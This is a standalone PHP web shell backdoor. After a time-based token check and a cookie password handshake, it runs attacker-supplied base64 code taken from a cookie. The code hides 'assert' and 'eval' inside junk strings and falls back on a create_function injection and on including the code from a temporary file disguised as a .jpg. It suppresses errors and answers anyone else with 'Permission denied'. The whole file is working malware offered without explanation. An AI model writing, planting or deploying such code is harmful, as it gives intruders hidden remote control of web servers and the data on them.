<?php
	error_reporting(0);
	header("Content-Type: text/html; charset=gbk");

	function do_include($code){
		file_put_contents("tmp_Coconut.jpg",'<?php '.$code);
		include_once("tmp_Coconut.jpg");
		unlink("tmp_Coconut.jpg");
	}

	function do_create_func($code){
		create_function('$a',"1;}".$code."/*");
	}

	function do_null_name_func(){
		$a=function(){eval(base64_decode($_COOKIE['code']));};
		$a();
	}

	$time=array(md5(time()+96),md5(time()+97),md5(time()+98),md5(time()+99),md5(time()+100),md5(time()+101),md5(time()+102),md5(time()+103));
	if(!empty($_REQUEST['time'])&&$_REQUEST['time']!=$_GET['time']&&in_array($_REQUEST['time'],$time)){
		if(isset($_REQUEST['action'])&&$_REQUEST['action']=="pwd"){
			file_put_contents("pwd.txt",md5(md5(rand(1222,99999999)).rand(1222,99999999)));
			setcookie("hash",file_get_contents("pwd.txt"));
			setcookie("login",0);
		}elseif(isset($_COOKIE['a'])&&$_COOKIE['a']==file_get_contents("pwd.txt")){
			@unlink("pwd.txt");
			$code=base64_decode($_COOKIE['code']);
			$do="a123456ss123456er123456t";
			$php_code="eabc456vabc456aabc456l";
			if(function_exists("assert")&&PHP_VERSION<7){
				$func_name=@str_replace("123456", "", $do);
				$func_name(str_replace("abc456","",$php_code)."('".str_replace("'","\"",$code)."');");
			}elseif(function_exists("create_function")){
				do_create_func($code);
			}elseif(function_exists("include_once")){
				do_include($code);
			}else{
				do_null_name_func();
			}
		}
	}else{
		die("Permission denied");
	}
?>